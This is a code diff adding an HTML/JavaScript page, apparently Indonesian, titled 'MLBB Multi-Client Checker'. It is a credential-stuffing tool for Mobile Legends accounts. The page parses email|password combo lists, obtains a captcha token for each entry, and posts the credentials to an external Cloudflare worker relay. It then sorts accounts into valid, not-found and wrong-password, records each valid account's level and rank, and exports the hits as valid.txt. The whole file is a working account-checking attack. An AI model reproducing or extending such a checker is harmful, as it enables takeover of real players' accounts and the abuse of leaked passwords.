@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>MLBB Checker Multi-Client by Arif Hidayatulloh</title>
+<script src="https://cstaticdun.126.net/load.min.js"></script>
+<style>
+  body { font-family: Arial; max-width: 900px; margin: auto; padding: 20px; background: #121212; color: #eee; }
+  textarea, input { width: 100%; font-family: monospace; background: #1e1e1e; color: #eee; border: 1px solid #333; margin-bottom: 8px; }
+  button { padding: 10px 16px; cursor: pointer; margin-right: 8px; border: none; border-radius: 4px; }
+  button:hover { opacity: 0.9; }
+  #startBtn { background: #4caf50; color: white; }
+  #stopBtn { background: #f44336; color: white; }
+  #downloadBtn { background: #2196f3; color: white; }
+  .ok { color: #7CFC00; }
+  .bad { color: #FF6B6B; }
+  .info { color: #FFD866; }
+  .account-log { border: 1px solid #333; padding: 8px; margin-bottom: 4px; }
+</style>
+</head>
+<body>
+
+<h2>MLBB Multi-Client Checker by Arif Hidayatulloh</h2>
+
+<h3>Generate Akun Client Baru</h3>
+<label>Jumlah akun:</label>
+<input type="number" id="genCount" value="5" min="1" max="50">
+<button id="genBtn">Generate</button>
+<textarea id="combo" placeholder="user1@example.com|Pass123&#10;user2@example.com|Pass456"></textarea>
+
+<button id="startBtn">Start Checking</button>
+<button id="stopBtn" disabled>Stop</button>
+<button id="downloadBtn">Download valid.txt</button>
+
+<div id="status"></div>
+<div id="captcha-root"></div>
+<h3>Log:</h3>
+<div id="log"></div>
+
+<script>
+const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af"; 
+const WORKER_URL = "https://worker.bonar7527.workers.dev"; 
+
+let combos = [];
+let stopRequested = false;
+let neCaptchaInstance = null;
+let validResults = [];
+
+const logEl = document.getElementById("log");
+const statusEl = document.getElementById("status");
+const startBtn = document.getElementById("startBtn");
+const stopBtn = document.getElementById("stopBtn");
+const downloadBtn = document.getElementById("downloadBtn");
+const comboTextarea = document.getElementById("combo");
+const genBtn = document.getElementById("genBtn");
+const genCount = document.getElementById("genCount");
+
+function appendLog(text, cls) {
+  const div = document.createElement("div");
+  div.textContent = text;
+  if(cls) div.className = cls;
+  logEl.appendChild(div);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function parseCombos(text) {
+  return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(line => {
+    let e,p;
+    if(line.includes("|")) [e,p]=line.split("|",2);
+    else if(line.includes(":")) [e,p]=line.split(":",2);
+    else { appendLog(`Format salah: ${line}`, "info"); return null; }
+    return { email:e.trim(), password:p.trim(), countdown:0 };
+  }).filter(Boolean);
+}
+
+function generateAccounts(count){
+  const accounts = [];
+  for(let i=0;i<count;i++){
+    const user = `client${Date.now()}${Math.floor(Math.random()*1000)}@example.com`;
+    const pass = `Pass${Math.floor(Math.random()*10000)}`;
+    accounts.push(`${user}|${pass}`);
+  }
+  comboTextarea.value += accounts.join("\n") + "\n";
+}
+
+genBtn.addEventListener("click", ()=>{
+  generateAccounts(parseInt(genCount.value));
+});
+
+function showCaptchaOnce() {
+  return new Promise((resolve,reject)=>{
+    const root = document.getElementById("captcha-root");
+    root.innerHTML="";
+    if(!window.initNECaptcha){ reject("initNECaptcha missing"); return; }
+    if(neCaptchaInstance && neCaptchaInstance.destroy) neCaptchaInstance.destroy();
+    try{
+      initNECaptcha({
+        captchaId: CAPTCHA_ID,
+        element: "#captcha-root",
+        mode: "embed",
+        width: "320px",
+        onVerify(err,data){
+          if(err || !data.validate){ reject(err||"no token"); return; }
+          if(neCaptchaInstance.destroy) neCaptchaInstance.destroy();
+          resolve(data.validate);
+        },
+        onLoad(instance){ neCaptchaInstance=instance; }
+      });
+    }catch(e){ reject(e); }
+  });
+}
+
+function startCountdown(accountDiv, duration){
+  let sec = duration;
+  accountDiv.textContent = `Login valid selama: ${sec}s`;
+  const interval = setInterval(()=>{
+    sec--;
+    if(sec>=0) accountDiv.textContent = `Login valid selama: ${sec}s`;
+    else clearInterval(interval);
+  },1000);
+}
+
+async function checkOneAccount(account) {
+  const accDiv = document.createElement("div");
+  accDiv.className="account-log info";
+  accDiv.textContent = `Minta captcha untuk ${account.email}`;
+  logEl.appendChild(accDiv);
+  statusEl.textContent=`Checking ${account.email}`;
+  let token;
+  try { token = await showCaptchaOnce(); }
+  catch(e){ accDiv.textContent=`Captcha gagal untuk ${account.email}: ${e}`; accDiv.className="bad"; return; }
+
+  try {
+    const form = new URLSearchParams();
+    form.append("email",account.email);
+    form.append("password",account.password);
+    form.append("e_captcha",token);
+
+    const resp = await fetch(WORKER_URL+"/check",{ method:"POST", body:form });
+    const data = await resp.json();
+
+    if(data.code===0 && data.data){
+      const info=data.data;
+      const line=`${info.email}:${info.password} | Level:${info.level} | Rank:${info.rank_level}`;
+      accDiv.textContent=`VALID => ${line}`;
+      accDiv.className="ok";
+      validResults.push(line);
+      startCountdown(accDiv,10);
+    } else if(data.code===1004) { accDiv.textContent=`[NOT FOUND] ${account.email}`; accDiv.className="bad"; }
+    else if(data.code===1005) { accDiv.textContent=`[WRONG PASS] ${account.email}`; accDiv.className="bad"; }
+    else { accDiv.textContent=`LAINNYA => ${account.email} | ${JSON.stringify(data)}`; accDiv.className="info"; }
+  } catch(e){ accDiv.textContent=`Error ${account.email}: ${e}`; accDiv.className="bad"; }
+}
+
+async function startProcess(){
+  stopRequested=false;
+  startBtn.disabled=true;
+  stopBtn.disabled=false;
+  logEl.innerHTML="";
+  validResults=[];
+  combos=parseCombos(comboTextarea.value);
+  if(combos.length===0){ appendLog("Tidak ada akun untuk dicek","info"); startBtn.disabled=false; stopBtn.disabled=true; return; }
+
+  appendLog(`Mulai cek ${combos.length} akun. Klik CAPTCHA tiap akun.`,"info");
+
+  for(let i=0;i<combos.length;i++){
+    if(stopRequested){ appendLog("Proses dihentikan user","info"); break; }
+    await checkOneAccount(combos[i]);
+  }
+
+  appendLog("Selesai","info");
+  statusEl.textContent="Selesai";
+  startBtn.disabled=false;
+  stopBtn.disabled=true;
+}
+
+startBtn.addEventListener("click",startProcess);
+stopBtn.addEventListener("click",()=>{ stopRequested=true; stopBtn.disabled=true; });
+downloadBtn.addEventListener("click",()=>{
+  if(validResults.length===0){ alert("Belum ada akun valid."); return; }
+  const blob=new Blob([validResults.join("\n")],{type:"text/plain"});
+  const url=URL.createObjectURL(blob);
+  const a=document.createElement("a");
+  a.href=url; a.download="valid.txt"; a.click();
+  URL.revokeObjectURL(url);
+});
+</script>
+</body>
+</html>
